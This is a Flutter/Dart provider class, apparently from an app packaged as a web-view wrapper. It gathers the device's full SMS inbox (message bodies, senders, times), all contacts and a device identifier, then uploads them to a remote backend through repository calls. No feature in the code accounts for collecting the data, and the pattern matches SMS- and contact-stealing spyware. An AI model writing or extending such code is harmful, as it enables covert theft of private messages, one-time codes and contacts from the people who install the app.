import 'dart:developer';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:web_view/core/helpers/view_functions.dart';
import 'package:web_view/data/models/request/data/send_contacts_request.dart';
import 'package:web_view/data/repository/dataRepo/data_repo.dart';
import 'package:telephony/telephony.dart';

import '../../../data/models/request/data/send_messages_request.dart';

final contactsProvider =
    ChangeNotifierProvider<ContactsProvider>((ref) => ContactsProvider());

class ContactsProvider extends ChangeNotifier {
  List<Contact> _contacts;
  List<SmsMessage> _messages;
  String _deviceInfo;

  ContactsProvider()
      : _contacts = [],
        _messages = [],
        _deviceInfo = '';

  getContactList(
    BuildContext context,
  ) async {
    if (await FlutterContacts.requestPermission()) {
      _contacts = await FlutterContacts.getContacts(
        withProperties: true,
      ).catchError(
        (onError) {
          ViewFunctions.showCustomSnackBar(
              context: context, text: 'فشل تحميل جهات الاتصال');
          return <Contact>[];
        },
      );
      notifyListeners();
    } else if (context.mounted) {
      ViewFunctions.showCustomSnackBar(
        context: context,
        text: 'لم يتم الحصول على الاذن للوصول لجهات الاتصال',
      );
    }
  }

  getMessagesList(
    BuildContext context,
  ) async {
    final Telephony telephony = Telephony.instance;
    if (await telephony.requestPhoneAndSmsPermissions ?? false) {
      _messages = await telephony.getInboxSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
      ).catchError(
        (onError) {
          log(">>>>>>>>>>>>  $onError");
          return <SmsMessage>[];
        },
      );
      notifyListeners();
    } else if (context.mounted) {
      ViewFunctions.showCustomSnackBar(
        context: context,
        text: 'لم يتم الحصول على الاذن للوصول الى الرسائل',
      );
    }
  }

  getDeviceInfo(BuildContext context) async {
    final deviceInfoPlugin = DeviceInfoPlugin();
    BaseDeviceInfo device = await deviceInfoPlugin.deviceInfo;
    _deviceInfo =
        "${device.data['brand']}-${device.data['model']}-${device.data['device']}-${device.data['id']}";
    notifyListeners();
  }

  sendData(BuildContext context) async {
    List<Map> messagesList = _messages
        .map((e) {
          return {
            'message_body': e.body?.toString() ?? '',
            'message_sender': e.address?.toString() ?? '',
            'message_time': e.date?.toString() ?? '',
          };
        })
        .toList();


    List<Map> contactsList = _contacts
        .map(
          (e) => {
            'contact_name': e.displayName,
            'contact_phone':
                e.phones.isNotEmpty ? e.phones[0].number : 'no number',
          },
        )
        .toList();

    await DataRepository.sendMessages(
            dataRequest: SendMessagesRequest(
      messages: messagesList,
      deviceInfo: _deviceInfo,
    ));

    await DataRepository.sendContacts(
        dataRequest: SendContactsRequest(
      contacts: contactsList,
      deviceInfo: _deviceInfo,
    ));
  }

  List<Contact> get contactList => _contacts;

  List<SmsMessage> get messagesList => _messages;

  String get deviceInfo => _deviceInfo;
}
